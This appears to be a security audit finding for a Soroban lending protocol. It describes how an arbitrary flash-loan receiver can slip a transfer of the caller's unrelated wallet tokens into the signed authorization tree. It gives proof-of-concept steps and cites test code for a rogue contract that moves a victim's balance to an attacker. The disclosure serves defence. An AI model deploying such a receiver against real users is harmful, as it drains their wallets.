### Title
Unbounded flash-loan receiver code can request extra wallet authorizations and steal unrelated user tokens - (File: contracts/pool/src/ops/flash.rs)

### Summary
`flash_loan` allows the caller to select an arbitrary Wasm receiver and invokes its `execute_flash_loan` implementation while the caller’s authorization context is active. [1](#0-0) [2](#0-1) 

A malicious receiver can invoke a token transfer from the caller to an attacker-controlled address; Soroban records that transfer as a child of the caller’s authorization tree, so it succeeds if the caller signs the expanded tree returned by simulation. [3](#0-2) 

### Finding Description
The controller authenticates `caller` with `caller.require_auth()` and then delegates execution to the pool. [4](#0-3) [1](#0-0) 

Both layers only verify that `receiver` is a Wasm contract; they do not constrain the receiver to a trusted implementation or restrict the authorization sub-invocations that receiver may request. [5](#0-4) [2](#0-1) [6](#0-5) 

The pool transfers principal, calls the attacker-selected contract through `invoke_contract`, checks that the pool balance did not change, and then pulls repayment from the receiver. [7](#0-6) [8](#0-7) 

The harness demonstrates the underlying Soroban behavior: a nested contract can add a caller-funded token transfer to the authorization tree, and enforcing auth accepts it when that child invocation is signed. [9](#0-8) [3](#0-2) 

### Impact Explanation
A user who initiates a flash loan through a malicious application and signs the generated authorization tree can lose unrelated wallet tokens, including tokens not used by the loan. [10](#0-9) 

The protocol’s post-callback pool balance checks only protect the pool’s flash-loan principal and fee; they do not limit other token transfers requested by the receiver under the caller’s authorization. [7](#0-6) [11](#0-10) 

### Likelihood Explanation
Exploitation requires the victim to submit a `flash_loan` using an attacker-controlled `receiver` and to sign an authorization tree containing an unexpected token-transfer child. [8](#0-7) [3](#0-2) 

This is more than a purely theoretical callback issue because the receiver address is caller-controlled and arbitrary Wasm is expressly accepted. [5](#0-4) [6](#0-5) 

### Recommendation
Restrict flash receivers to a governance-approved registry or provide a dedicated receiver wrapper that cannot request caller-scoped token transfers. [2](#0-1) 

If arbitrary receivers remain supported, clients should simulate the transaction, reject any authorization child other than the expected flash-loan invocation, and prominently display the receiver contract identity before signing. [10](#0-9) 

### Proof of Concept
1. Deploy `MaliciousReceiver` with victim, wallet token, attacker destination, and amount stored in its constructor. [12](#0-11) 
2. Have the victim call `controller.flash_loan(caller=victim, hub_asset=listed_asset, amount>0, receiver=MaliciousReceiver, data)`; the controller authenticates the victim and forwards the receiver to the pool. [1](#0-0) 
3. During `execute_flash_loan`, the receiver calls `token.transfer(victim, attacker, wallet_balance)` and also grants the pool the required `amount + fee` allowance. [13](#0-12) 
4. Simulation reports the malicious token transfer as a child authorization; if the victim signs that tree, the unrelated wallet-token transfer executes while the flash-loan settlement checks still pass. [3](#0-2)

### Citations

**File:** contracts/controller/src/strategies/flash_loan.rs (L22-32)
```rust
    require_authorized_caller(env, caller);
    require_positive_amount(env, amount);
    config::require_hub_active(env, hub_asset.hub_id);

    require_wasm_receiver(env, receiver);

    let mut cache = Context::new(env);
    let pool_addr = cache.cached_pool_address();

    let fee = storage::with_flash_guard(env, || {
        pool_flash_loan_call(env, &pool_addr, hub_asset, caller, receiver, amount, data)
```

**File:** contracts/pool/src/ops/flash.rs (L48-68)
```rust
    let mut cache = prepare(env, hub_asset, amount);
    require_wasm_receiver(env, &receiver);

    let pool = env.current_contract_address();
    let asset = token::Client::new(env, &cache.params().asset_id);
    let terms = terms(
        env,
        amount,
        cache.params().flashloan_fee,
        asset.balance(&pool),
    );

    asset.transfer(&pool, &receiver, &amount);
    require_balance(env, &asset, &pool, terms.balance_after_payout);
    invoke_receiver(
        env, &cache, &receiver, initiator, amount, terms.fee, &pool, data,
    );

    require_balance(env, &asset, &pool, terms.balance_after_payout);
    collect_repayment(env, &asset, &pool, &receiver, &terms);

```

**File:** contracts/pool/src/ops/flash.rs (L150-179)
```rust
    env.invoke_contract::<()>(
        receiver,
        &Symbol::new(env, "execute_flash_loan"),
        (
            initiator,
            cache.params().asset_id.clone(),
            amount,
            fee,
            pool.clone(),
            data,
        )
            .into_val(env),
    );
}

/// Pulls principal + fee via `transfer_from` after verifying allowance.
fn collect_repayment(
    env: &Env,
    asset: &token::Client,
    pool: &Address,
    receiver: &Address,
    terms: &FlashTerms,
) {
    assert_with_error!(
        env,
        asset.allowance(receiver, pool) >= terms.total_repayment,
        FlashLoanError::InvalidFlashloanRepay
    );
    asset.transfer_from(pool, receiver, pool, &terms.total_repayment);
    require_balance(env, asset, pool, terms.balance_after_repayment);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-47)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/risk/validation.rs (L12-16)
```rust
/// Authenticates `caller` and rejects execution during a flash loan.
pub(crate) fn require_authorized_caller(env: &Env, caller: &Address) {
    caller.require_auth();
    require_not_flash_loaning(env);
}
```

**File:** common/src/validation.rs (L72-80)
```rust
/// Asserts that `receiver`'s executable is a Wasm contract, panicking with
/// `FlashLoanError::InvalidFlashloanReceiver` otherwise.
pub fn require_wasm_receiver(env: &Env, receiver: &Address) {
    assert_with_error!(
        env,
        matches!(receiver.executable(), Some(Executable::Wasm(_))),
        FlashLoanError::InvalidFlashloanReceiver
    );
}
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```
